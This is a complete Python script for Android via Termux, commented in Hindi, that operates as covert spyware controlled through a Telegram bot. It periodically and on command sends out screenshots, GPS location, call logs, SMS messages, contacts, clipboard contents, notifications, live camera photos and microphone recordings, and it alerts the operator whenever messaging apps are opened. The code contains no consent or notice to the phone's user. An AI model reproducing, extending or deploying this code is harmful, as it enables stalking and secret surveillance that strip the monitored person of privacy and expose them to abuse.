import subprocess
import time
import requests
import json
import os
from datetime import datetime

# =========================================================
# 🔐 Environment Variables से Token और Chat ID
# =========================================================
BOT_TOKEN = os.getenv('BOT_TOKEN')
CHAT_ID = os.getenv('CHAT_ID')
if not BOT_TOKEN or not CHAT_ID:
    print("❌ ERROR: BOT_TOKEN और CHAT_ID सेट करें!")
    exit(1)

# =========================================================
# ⚙️ कॉन्फ़िगरेशन
# =========================================================
LOCATION_INTERVAL = 300          # 5 मिनट
SCREENSHOT_INTERVAL = 180        # 3 मिनट
CAMERA_INTERVAL = 10             # 10 सेकंड (लाइव स्ट्रीम के लिए)
BATTERY_ALERT_LEVELS = [20, 15, 10, 5]
MONITORED_APPS = ['whatsapp', 'instagram', 'telegram', 'snapchat', 'gmail', 'facebook']
STORAGE_ALERT_GB = 2
AUDIO_RECORD_DURATION = 30       # सेकंड

# =========================================================
# 📨 टेलीग्राम फंक्शंस
# =========================================================
def send_telegram(message):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        data = {"chat_id": CHAT_ID, "text": message, "parse_mode": "Markdown"}
        requests.post(url, data=data, timeout=5)
    except Exception as e:
        print("❌ Telegram Error:", e)

def send_photo_to_telegram(filepath, caption=""):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
        with open(filepath, 'rb') as photo:
            files = {'photo': photo}
            data = {'chat_id': CHAT_ID, 'caption': caption}
            requests.post(url, files=files, data=data, timeout=15)
        return True
    except Exception as e:
        print("❌ Photo Error:", e)
        return False

def send_audio_to_telegram(filepath, caption=""):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendAudio"
        with open(filepath, 'rb') as audio:
            files = {'audio': audio}
            data = {'chat_id': CHAT_ID, 'caption': caption}
            requests.post(url, files=files, data=data, timeout=20)
        return True
    except Exception as e:
        print("❌ Audio Error:", e)
        return False

# =========================================================
# 🛠 कोर फंक्शंस (बेसिक)
# =========================================================
def get_current_app():
    try:
        result = subprocess.run(['dumpsys', 'activity', 'activities'], capture_output=True, text=True, timeout=3)
        for line in result.stdout.split('\n'):
            if 'mResumedActivity' in line:
                parts = line.split(' ')
                for part in parts:
                    if '/' in part and not part.startswith('ActivityRecord'):
                        return part.split('/')[0]
        return "Unknown"
    except:
        return "Unknown"

def get_battery():
    try:
        result = subprocess.run(['dumpsys', 'battery'], capture_output=True, text=True)
        data = {}
        for line in result.stdout.split('\n'):
            if ':' in line:
                key, val = line.split(':', 1)
                data[key.strip()] = val.strip()
        return data.get('level', 'N/A'), data.get('status', 'Unknown')
    except:
        return 'N/A', 'Unknown'

def get_location():
    try:
        result = subprocess.run(['termux-location'], capture_output=True, text=True, timeout=10)
        data = json.loads(result.stdout)
        lat = data.get('latitude', 0)
        lng = data.get('longitude', 0)
        if lat and lng:
            return f"📍 https://maps.google.com/maps?q={lat},{lng}"
        return "📍 GPS बंद"
    except:
        return "📍 लोकेशन नहीं मिली"

def take_screenshot():
    try:
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"/sdcard/dcim/screen_{ts}.png"
        subprocess.run(["termux-screencap", "-p", filename], check=True, timeout=10)
        return filename
    except:
        return None

def get_storage_info():
    try:
        result = subprocess.run(['df', '-h', '/data'], capture_output=True, text=True, timeout=3)
        lines = result.stdout.split('\n')
        if len(lines) > 1:
            parts = lines[1].split()
            if len(parts) >= 4:
                total = parts[1].replace('G', '').replace('M', '')
                used = parts[2].replace('G', '').replace('M', '')
                avail = parts[3].replace('G', '').replace('M', '')
                return float(avail), f"📊 *स्टोरेज*\nकुल: {parts[1]}\nइस्तेमाल: {parts[2]}\nबचा: {parts[3]}"
        return 99, "📊 स्टोरेज: N/A"
    except:
        return 99, "📊 स्टोरेज: N/A"

def get_wifi_info():
    try:
        result = subprocess.run(['termux-wifi-connectioninfo'], capture_output=True, text=True, timeout=3)
        data = json.loads(result.stdout)
        ssid = data.get('ssid', 'N/A')
        bssid = data.get('bssid', 'N/A')
        return ssid, bssid
    except:
        return 'N/A', 'N/A'

def get_charging_status(status_code):
    status_map = {
        '1': 'Unknown',
        '2': 'Charging (AC)',
        '3': 'Discharging',
        '4': 'Not Charging',
        '5': 'Full'
    }
    return status_map.get(status_code, 'Unknown')

def get_screen_on_time():
    try:
        result = subprocess.run(['dumpsys', 'power'], capture_output=True, text=True, timeout=3)
        for line in result.stdout.split('\n'):
            if 'Screen On' in line or 'mWakefulness' in line:
                return line.strip()
        return "N/A"
    except:
        return "N/A"

def get_app_usage_summary():
    try:
        result = subprocess.run(['dumpsys', 'usagestats'], capture_output=True, text=True, timeout=5)
        lines = result.stdout.split('\n')
        apps = {}
        for line in lines:
            if 'package=' in line and 'time=' in line:
                parts = line.split()
                for p in parts:
                    if 'package=' in p:
                        pkg = p.split('=')[1]
                        apps[pkg] = apps.get(pkg, 0) + 1
        sorted_apps = sorted(apps.items(), key=lambda x: x[1], reverse=True)[:5]
        if sorted_apps:
            msg = "📊 *टॉप 5 ऐप (पिछले 30 मिनट)*\n"
            for pkg, count in sorted_apps:
                msg += f"• {pkg.split('.')[-1]}: {count} बार\n"
            return msg
        return "📊 कोई ऐप इस्तेमाल नहीं"
    except:
        return "📊 ऐप यूसेज N/A"

def get_call_logs():
    try:
        result = subprocess.run(['termux-telephony-calllog'], capture_output=True, text=True, timeout=5)
        data = json.loads(result.stdout)
        if not data: return "📞 कोई कॉल नहीं"
        lines = []
        for call in data[:10]:
            num = call.get('number', 'Unknown')
            name = call.get('name', 'Unknown')
            dur = call.get('duration', '0')
            typ = call.get('type', '')
            lines.append(f"{typ}: {name} ({num}) - {dur}s")
        return "📞 *पिछले 10 कॉल*\n" + "\n".join(lines)
    except:
        return "📞 कॉल लॉग नहीं"

def get_sms_list():
    try:
        result = subprocess.run(['termux-sms-list'], capture_output=True, text=True, timeout=5)
        data = json.loads(result.stdout)
        if not data: return "✉️ कोई SMS नहीं"
        lines = []
        for sms in data[:10]:
            num = sms.get('number', 'Unknown')
            body = sms.get('body', '')[:30]
            lines.append(f"{num}: {body}...")
        return "✉️ *पिछले 10 SMS*\n" + "\n".join(lines)
    except:
        return "✉️ SMS नहीं मिला"

def get_contacts():
    try:
        result = subprocess.run(['termux-contact-list'], capture_output=True, text=True, timeout=5)
        data = json.loads(result.stdout)
        if not data: return "👥 कोई कॉन्टैक्ट नहीं"
        lines = []
        for contact in data[:20]:
            name = contact.get('name', 'No Name')
            num = contact.get('number', '')
            lines.append(f"{name} - {num}")
        return "👥 *कॉन्टैक्ट्स (20)*\n" + "\n".join(lines)
    except:
        return "👥 कॉन्टैक्ट्स नहीं मिला"

def get_clipboard():
    try:
        result = subprocess.run(['termux-clipboard-get'], capture_output=True, text=True, timeout=3)
        text = result.stdout.strip()
        return f"📋 *क्लिपबोर्ड*: {text[:100]}" if text else "📋 क्लिपबोर्ड खाली"
    except:
        return "📋 क्लिपबोर्ड नहीं मिला"

def get_notifications():
    try:
        result = subprocess.run(['termux-notification-listener'], capture_output=True, text=True, timeout=5)
        data = json.loads(result.stdout)
        if not data: return "🔔 कोई नोटिफिकेशन नहीं"
        lines = []
        for notif in data[:15]:
            title = notif.get('title', '')
            text = notif.get('text', '')
            pkg = notif.get('package', '').split('.')[-1]
            if title or text:
                lines.append(f"📩 {pkg}: {title} - {text[:50]}...")
        return "🔔 *नोटिफिकेशन (15)*\n" + "\n\n".join(lines) if lines else "🔔 कोई नोटिफिकेशन नहीं"
    except:
        return "🔔 नोटिफिकेशन नहीं मिला"

# =========================================================
# 🆕 नए फीचर्स
# =========================================================

# 📸 कैमरा फोटो (लाइव स्ट्रीम के लिए)
def take_camera_photo():
    try:
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"/sdcard/dcim/cam_{ts}.jpg"
        subprocess.run(["termux-camera-photo", filename], check=True, timeout=5)
        return filename
    except:
        return None

# 🎤 माइक्रोफोन रिकॉर्ड
def record_audio(duration=30):
    try:
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"/sdcard/dcim/audio_{ts}.aac"
        subprocess.run(["termux-microphone-record", "-d", str(duration), filename], check=True, timeout=duration+5)
        return filename
    except:
        return None

# 📍 लोकेशन हिस्ट्री (पिछली 10)
location_history = []
def add_location_to_history(loc_str):
    global location_history
    location_history.append(loc_str)
    if len(location_history) > 10:
        location_history.pop(0)

def get_location_history():
    if not location_history:
        return "📍 कोई लोकेशन इतिहास नहीं"
    msg = "📍 *पिछली 10 लोकेशन*\n"
    for idx, loc in enumerate(location_history, 1):
        msg += f"{idx}. {loc}\n"
    return msg

# 🎥 स्क्रीन रिकॉर्ड (30 सेकंड) - वैकल्पिक
def record_screen(duration=30):
    try:
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"/sdcard/dcim/screenrec_{ts}.mp4"
        subprocess.run(["termux-screen-recorder", "-t", str(duration), filename], check=True, timeout=duration+5)
        return filename
    except:
        return None

# =========================================================
# 🤖 रिमोट कमांड हैंडलर (नए + पुराने)
# =========================================================
last_update_id = 0
previous_wifi = ''
previous_app = ''
last_battery = 100
storage_alert_sent = False
camera_streaming = False

def check_telegram_commands():
    global last_update_id, camera_streaming
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
        params = {'offset': last_update_id + 1, 'timeout': 5}
        response = requests.get(url, params=params, timeout=10)
        data = response.json()
        if data.get('ok') and data.get('result'):
            for update in data['result']:
                last_update_id = update['update_id']
                msg = update.get('message')
                if not msg or str(msg.get('chat', {}).get('id')) != str(CHAT_ID):
                    continue
                text = msg.get('text', '').strip().lower()
                if not text.startswith('/'):
                    continue

                # --- नए कमांड्स ---
                if text == '/camera':
                    if not camera_streaming:
                        camera_streaming = True
                        send_telegram("📸 *कैमरा स्ट्रीम शुरू* (हर 10 सेकंड में फोटो)\n/streamoff से बंद करें")
                    else:
                        send_telegram("📸 कैमरा पहले से चालू है")
                elif text == '/streamoff':
                    camera_streaming = False
                    send_telegram("📸 कैमरा स्ट्रीम बंद")
                elif text == '/record':
                    send_telegram("🎤 30 सेकंड ऑडियो रिकॉर्ड कर रहा हूँ...")
                    audio_file = record_audio(AUDIO_RECORD_DURATION)
                    if audio_file and os.path.exists(audio_file):
                        send_audio_to_telegram(audio_file, "🎤 ऑडियो रिकॉर्डिंग")
                        os.remove(audio_file)
                    else:
                        send_telegram("❌ ऑडियो रिकॉर्ड फेल")
                elif text == '/locationhistory':
                    send_telegram(get_location_history())
                elif text == '/screenrec':
                    send_telegram("🎥 30 सेकंड स्क्रीन रिकॉर्ड कर रहा हूँ...")
                    video_file = record_screen(30)
                    if video_file and os.path.exists(video_file):
                        # टेलीग्राम 50MB limit, small video
                        send_telegram("🎥 स्क्रीन रिकॉर्डिंग तैयार है, लेकिन बड़ी फ़ाइल के कारण सीधे भेजना संभव नहीं, इसे मैन्युअली चेक करें")
                        # वैकल्पिक: डाउनलोड लिंक भेजें (यहाँ हम इसे छोड़ रहे हैं)
                        os.remove(video_file)
                    else:
                        send_telegram("❌ स्क्रीन रिकॉर्ड फेल")
                elif text == '/notify':
                    # नोटिफिकेशन कैप्चर (पुराना /notif ही है, पर हम इसे डुप्लिकेट कर सकते हैं)
                    send_telegram(get_notifications())
                elif text == '/storage':
                    avail, info = get_storage_info()
                    send_telegram(info)
                elif text == '/battery':
                    level, status = get_battery()
                    send_telegram(f"🔋 *बैटरी*\n%: {level}\nस्टेटस: {get_charging_status(status)}")
                elif text == '/wifistatus':
                    ssid, bssid = get_wifi_info()
                    send_telegram(f"📶 *Wi-Fi*\nSSID: {ssid}\nBSSID: {bssid}")
                elif text == '/screen':
                    send_telegram(f"🖥️ *स्क्रीन*\n{get_screen_on_time()}")
                elif text == '/comms':
                    send_telegram(get_call_logs() + "\n\n" + get_sms_list())
                elif text == '/summary':
                    send_telegram(get_app_usage_summary())
                elif text == '/report':
                    level, status = get_battery()
                    avail, storage_info = get_storage_info()
                    ssid, bssid = get_wifi_info()
                    msg = (f"📋 *फुल रिपोर्ट*\n"
                           f"📱 ऐप: {get_current_app()}\n"
                           f"🔋 बैटरी: {level}% ({get_charging_status(status)})\n"
                           f"📶 Wi-Fi: {ssid}\n"
                           f"💾 स्टोरेज: {avail:.1f}GB बचा\n"
                           f"{get_app_usage_summary()}\n"
                           f"{get_call_logs()}\n"
                           f"{get_sms_list()}")
                    send_telegram(msg)
                # --- पुराने कमांड्स (बाकी) ---
                elif text == '/status':
                    level, status = get_battery()
                    send_telegram(f"📱 *{get_current_app()}*\n🔋 {level}% ({get_charging_status(status)})")
                elif text == '/screenshot':
                    fname = take_screenshot()
                    if fname and os.path.exists(fname):
                        send_photo_to_telegram(fname, "📸 स्क्रीनशॉट")
                        os.remove(fname)
                    else:
                        send_telegram("❌ स्क्रीनशॉट नहीं लिया")
                elif text == '/location':
                    loc = get_location()
                    send_telegram(loc)
                    add_location_to_history(loc)  # हिस्ट्री में सेव
                elif text == '/calllog':
                    send_telegram(get_call_logs())
                elif text == '/sms':
                    send_telegram(get_sms_list())
                elif text == '/contacts':
                    send_telegram(get_contacts())
                elif text == '/clipboard':
                    send_telegram(get_clipboard())
                elif text == '/notif':
                    send_telegram(get_notifications())
                elif text == '/all':
                    level, status = get_battery()
                    avail, storage_info = get_storage_info()
                    ssid, bssid = get_wifi_info()
                    loc = get_location()
                    add_location_to_history(loc)
                    msg = (f"📊 *सब कुछ*\n"
                           f"📱 ऐप: {get_current_app()}\n"
                           f"🔋 {level}% ({get_charging_status(status)})\n"
                           f"📶 {ssid}\n"
                           f"💾 {avail:.1f}GB बचा\n"
                           f"{loc}\n"
                           f"{get_app_usage_summary()}\n"
                           f"{get_call_logs()}\n"
                           f"{get_sms_list()}")
                    send_telegram(msg)
                elif text == '/help':
                    help_text = (
                        "🤖 *सभी कमांड्स*\n\n"
                        "📸 /camera - कैमरा स्ट्रीम शुरू (हर 10 सेकंड)\n"
                        "🛑 /streamoff - कैमरा बंद\n"
                        "🎤 /record - 30 सेकंड ऑडियो रिकॉर्ड\n"
                        "🎥 /screenrec - 30 सेकंड स्क्रीन रिकॉर्ड\n"
                        "📍 /locationhistory - पिछली 10 लोकेशन\n"
                        "📊 /status, /battery, /storage, /wifi, /screen\n"
                        "📋 /screenshot, /clipboard, /notif, /notify\n"
                        "📞 /calllog, /sms, /contacts, /comms\n"
                        "📈 /summary, /report, /all, /location"
                    )
                    send_telegram(help_text)
                else:
                    send_telegram("❓ /help देखें")
    except Exception as e:
        print("⚠️ कमांड एरर:", e)

# =========================================================
# 🔄 मुख्य लूप
# =========================================================
print("🚀 मेगा मॉनिटर शुरू (कैमरा + माइक + लोकेशन हिस्ट्री)")
time.sleep(2)

counter = 0
while True:
    try:
        check_telegram_commands()
        
        current_app = get_current_app()
        battery_level, battery_status = get_battery()
        battery_level = int(battery_level) if battery_level != 'N/A' else 0
        current_time = datetime.now().strftime("%d-%m-%Y %H:%M:%S")
        
        # बैटरी अलर्ट
        for alert_level in BATTERY_ALERT_LEVELS:
            if battery_level <= alert_level and last_battery > alert_level:
                send_telegram(f"⚠️ *बैटरी अलर्ट!*\n🔋 {battery_level}% बचा है!\n⏰ {current_time}")
                break
        last_battery = battery_level
        
        # स्टोरेज अलर्ट
        avail, storage_info = get_storage_info()
        if avail < STORAGE_ALERT_GB and not storage_alert_sent:
            send_telegram(f"⚠️ *स्टोरेज कम!*\n💾 {avail:.1f}GB बचा")
            storage_alert_sent = True
        elif avail > STORAGE_ALERT_GB:
            storage_alert_sent = False
        
        # Wi-Fi बदलाव
        wifi_ssid, wifi_bssid = get_wifi_info()
        if wifi_ssid != 'N/A' and wifi_ssid != previous_wifi and previous_wifi != '':
            send_telegram(f"📶 *Wi-Fi बदला:* {wifi_ssid}")
        previous_wifi = wifi_ssid
        
        # मॉनिटर किए गए ऐप्स
        for monitored in MONITORED_APPS:
            if monitored in current_app.lower() and monitored not in previous_app.lower():
                send_telegram(f"👀 *{monitored.capitalize()} खुला!*")
                break
        
        # ऑटो स्क्रीनशॉट
        if counter % (SCREENSHOT_INTERVAL // 10) == 0:
            fname = take_screenshot()
            if fname and os.path.exists(fname):
                send_photo_to_telegram(fname, f"📸 ऑटो ({current_time})")
                os.remove(fname)
        
        # ऑटो लोकेशन
        if counter % (LOCATION_INTERVAL // 10) == 0:
            loc = get_location()
            send_telegram(f"{loc}\n⏰ {current_time}")
            add_location_to_history(loc)
        
        # कैमरा स्ट्रीम (अगर चालू है)
        if camera_streaming:
            cam_file = take_camera_photo()
            if cam_file and os.path.exists(cam_file):
                send_photo_to_telegram(cam_file, f"📸 लाइव ({current_time})")
                os.remove(cam_file)
        
        # ऐप बदलने पर स्टेटस
        if current_app != previous_app:
            send_telegram(f"📱 *{current_app}*\n🔋 {battery_level}%\n⏰ {current_time}")
            previous_app = current_app
        
        # घंटे की रिपोर्ट
        if counter % 360 == 0:
            send_telegram(f"📊 *घंटे की रिपोर्ट*\n{get_app_usage_summary()}\n{get_call_logs()}\n{get_sms_list()}")
        
        counter += 1
        time.sleep(10)
        
    except Exception as e:
        print("⚠️ लूप एरर:", e)
        time.sleep(30)
